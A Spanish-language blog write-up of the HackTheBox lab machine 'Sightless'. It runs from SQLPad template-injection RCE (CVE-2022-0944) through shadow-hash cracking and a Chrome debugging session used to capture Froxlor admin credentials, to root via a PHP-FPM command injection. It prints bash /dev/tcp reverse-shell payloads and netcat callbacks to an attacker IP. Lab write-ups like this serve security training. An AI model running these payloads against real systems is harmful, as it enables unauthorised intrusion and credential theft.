---
layout: single
title: write up Sightless HTB
excerpt:
date: 2025-1-17
classes: wide
header:
  teaser: https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Sightless_avatar.png
  teaser_home_page: true
categories:
  - hacking
  - Linux
  - SQLPad
  - RCE
  - CVE
  - Docker
  - Froxlor
  - Local Port Forwarding
  - Chrome
tags:  
  - hacking
  - Linux
  - SQLPad
  - RCE
  - CVE
  - Docker
  - Froxlor
  - Local Port Forwarding
  - Chrome
---

"Sightless" es una máquina de dificultad fácil en la plataforma HackTheBox. El servidor víctima ejecuta un servicio web que expone una vulnerabilidad SQL en una versión de SQLPad afectada por la CVE-2022-0944. Esta vulnerabilidad permite la ejecución remota de comandos (RCE), lo que nos brinda acceso inicial al sistema. Sin embargo, este servicio se ejecuta dentro de un contenedor Docker con privilegios de root. Al tener acceso root dentro del contenedor, podemos leer el archivo /etc/shadow, extraer los hashes de las contraseñas y luego intentar crackearlos. Una vez que una de las contraseñas es descifrada, podemos usarla para acceder a la máquina host a través de SSH.

Al ingresar al sistema, descubrimos que está en ejecución un servicio web interno llamado Froxlor. Además, encontramos una sesión activa de Google Chrome en la máquina víctima. Mediante un Local Port Forwarding, conseguimos conectarnos a esta sesión de Chrome, la cual expone credenciales para el panel de administración de Froxlor. Al acceder a este panel, podemos inyectar un script o tarea que nos otorga acceso como root en la máquina víctima.

lo primero como siempre empezamos con el escaneo de nmap
```bash
nmap -p- --open --min-rate 5000 -sT -Pn -vvv -n 10.10.11.32 -oG allports
```

![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118113230.png)

```bash
nmap -sVC -p21,22,80 10.10.11.34 -oN ports
```
![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118113350.png)

vemos un servidor ftp corriendo vamos a intentar loguear como anonimo

![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118113529.png)

nada no consigo nada

si hacemos un what web para ver lo que hay detras 
![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118113654.png)

conseguimos el dominio. lo ponemos en el /etc/hosts y lo repetimos

![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118114031.png)

vemos un correo electronico por hay
nada mas interesante 
vamos a acceder

![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118114410.png)

si nos vamos al apartado de servicios vemos algo que podria ser interesante

![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118114519.png)

vemos un panel de SQLPad
si le damos click

![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118114830.png)

vemos un subdominio nuevo por lo que devemos añadirlo al etc/hosts para poder ver la web

![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118115045.png)

vemos un panel sqlpad

si vamos a la esquina superior derecha veremos 3 puntitos que nos permiten clickar sobre una opcion about

![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118115431.png)

vemos la version de SQLPad
por lo que podriamos hacer una busqueda de CVE o exploits a su nombre y version

![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118115650.png)

![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118115720.png)

basicamnte podemos hacer un RCE a traves de una queri maliciosa y ponernos en escucha con netcat 

para poder hacerlo vamos a tener que hacer lo siguiente.
vamos a ir al panel de chose connection y vamos a crear una nueva usando de driver MYSql

![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118120300.png)

para cargar el payload malicioso hay que ponerlo en el apartado Database
en mi caso usare este

```sql
{{ process.mainModule.require('child_process').exec('bash -c "bash >& /dev/tcp/10.10.14.67/9999 0>&1"') }}
```

![[Pasted image 20250118120501.png]]

nos ponemos en eschucha con netcat

```bash
rlwrap -cAr nc -lvnp 9999
```

y le damos a test
![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118120651.png)
y tenemos shell. lo curioso es que somos root

![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118121100.png)

esto es curioso
![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118121145.png)

vale estamos dentro de un docker y somos root
por lo que podrimamos leer el etc/shadow 

![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118121441.png)

vemos un suuario michael al cual creo que podemos crekear la contraseña

para ello voy a usar hashcat

```bash
hashcat -m 1800 -a 0 -o resul.txt hash.txt /usr/share/wordlists/rockyou.txt
```

![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118122223.png)

tenemos las password de los dos

por lo que voy a usar nxc para comprobar si valen para ssh
```bash
nxc ssh 10.10.11.32 -u user.txt -p passwd.txt
```

![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118123102.png)

vemos que michael se puede por lo que vamos

![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118123444.png)

y tenemos el user

## root

si hacemos 
```bash
ss -ntlp
```

vemos una cosa curiosa

![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118123951.png)

vemos el puerto 8080 abierto
si hacemos un curl desde la propia maquian vemos cosas interesante:

```bash
curl -s 127.0.0.1:8080
```

![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118124303.png)
vemos una pagina web
por lo quehay que hacer Local Port Forwarding. yo lo voy a hacer con ssh, se podria con chisel y es mas profesional pero tampoco me quiero comer mucho la cabeza con una maquina de baja dificultada

entonces para ello vamos a hacerlo siguiente
```bash
ssh michael@10.10.11.32 -L 8080:172.17.0.2:8080
```

![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118125531.png)

vemos el siguiente panel de login 

pero niguna credencial vale. 
de vuelta a ssh si hacemos
```bash
ps aux 
```

![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118130042.png)

vemos que hay un servicio google crome corriendo
El usuario `john` tiene abierta una sesión con `Google Chrome`.

Usualmente, cuando ejecutamos un software como `Google Chrome`, éste requiere de puertos para funcionar. Como vimos previamente, teníamos muchos puertos abiertos. Podemos obtener todos los puertos abiertos en la máquina víctima jugando un poco con la consola:
```bash
ss -nltp | awk '{print $4}' | grep -v Local | awk -F : '{print $2}' | grep -v '^$' | sort -u
```

![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118130325.png)

De aquí, empezaremos a descargar los servicios los cuales sabemos qué están corriendo y ya hemos identificado: `21` (`FTP`), `22` (`SSH`), `53` (`DNS`), `80` (puerto `HTTP` página web principal), `3000` (puerto por defecto para SQLPad, como se pude ver [aquí](https://getsqlpad.com/en/getting-started/)), `3306` y `33060` (`MySQL`); y `8080` (servicio web `Froxlor`).

Luego de filtrar por todos aquellos puertos, sólo nos quedan 3 candidatos: `33569`, `33911` y `34001`.

nos los vamos a pasar todos por ssh:
```bash
ssh michael@sightless.htb -L 8080:admin.sightless.htb:8080 -L 33363:127.0.0.1:33363 -L 3000:127.0.0.1:3000 -L 41129:127.0.0.1:41129 -L 33060:127.0.0.1:33060 -L 35705:127.0.0.1:35705
```

ahora si habrimos chrome y ponemos chrome://inspect/#devices
veremoslo siguiente
![[Pasted image 20250118130807.png]]
si le damos a configure
![[Pasted image 20250118130903.png]]
vamos a poner ese puerto y le damos a done
Uno de los puertos que podría estar expuesto en la máquina víctima es el de la sesión de Google Chrome. En mi caso específico, el puerto y la IP que encontré fue 127.0.0.1:33911. Al añadirlo, aparece un mensaje de Froxlor. Si accedemos al primer enlace y seleccionamos la opción Inspect, podemos observar una animación en pantalla. Esta muestra cómo un usuario inicia sesión en el panel de Froxlor. Utilizando la pestaña de Desarrolladores, accedemos a la sección Network y, una vez el usuario haya iniciado sesión, podemos inspeccionar el recurso index.php y revisar la pestaña Payload. Allí encontramos:

![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250119113409.png)

Podemos ver que el parámetro loginname corresponde a un usuario llamado admin y la contraseña es ForlorfroxAdmin.

Luego, accedemos a http://127.0.0.1:8080 e ingresamos las credenciales admin:ForlorfroxAdmin, logrando acceder al panel como usuario admin:

![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250119113523.png)

En el panel, en la barra lateral izquierda, encontramos una pestaña llamada PHP. Al hacer clic en ella, vemos varias opciones. Entre ellas, se encuentra la pestaña PHP-FPM versions. Investigando un poco más, descubrimos que es una herramienta para gestionar procesos de PHP de manera eficiente.

Al hacer clic en PHP-FPM versions y luego en Create new PHP version, se muestra una nueva página. En esta, intentamos ejecutar el comando whoami y redirigir su salida a nuestra máquina atacante utilizando un pipe (|) junto con netcat. En el panel de Froxlor, ingresamos el comando whoami | nc 10.10.16.5 4444 y en nuestra máquina atacante iniciamos un listener en el puerto 4444 ejecutando nc -lvnp 4444. En la máquina víctima, añadimos el payload mencionado:

![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250119113715.png)

Sin embargo, encontramos un problema. Al hacer clic en Save, obtenemos un error. Anteriormente habíamos probado con comandos más sencillos como whoami e id, y funcionaron, por lo que sospechamos que el pipe (|) podría estar interfiriendo. Debido a que nuestra sesión con el usuario michael está siendo utilizada por Chisel para establecer el túnel, nos volvemos a conectar por SSH como michael (sin cerrar la sesión de Chisel) y creamos un script simple en Bash que enviará una reverse shell a nuestra máquina atacante:
```bash
michael@sightless:~$ echo -e '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.16.5/443 0>&1"' > /dev/shm/rev.sh

michael@sightless:~$ cat /dev/shm/rev.sh

#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.16.5/443 0>&1"

michael@sightless:~$ chmod +x /dev/shm/rev.sh
```
En nuestra máquina atacante, iniciamos un listener con netcat en el puerto 443:
```bash
nc -lvnp 443
```
Luego, añadimos este nuevo payload a la sección PHP-FPM en el panel de Froxlor.

Posteriormente, nos dirigimos a System > Settings > PHP-FPM, desactivamos el servicio presionando el botón al lado de Activate to use y hacemos clic en Save. Después, volvemos a la pestaña anterior, activamos el servicio nuevamente para "reiniciarlo", y hacemos clic en Save otra vez.

En la sección de Cronjob Settings, encontramos un cronjob que se ejecuta cada 5 minutos llamado Generating of configfiles. Supusimos que este cronjob ejecutaría el payload, por lo que tuvimos que esperar hasta la próxima hora y minutos terminados en XX:X5 (es decir, cada 5 minutos).

![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250119113755.png)


Después de unos minutos, el cronjob se ejecuta y, finalmente, conseguimos una conexión en nuestro listener como usuario root.

![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250119113815.png)

![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118131751.png)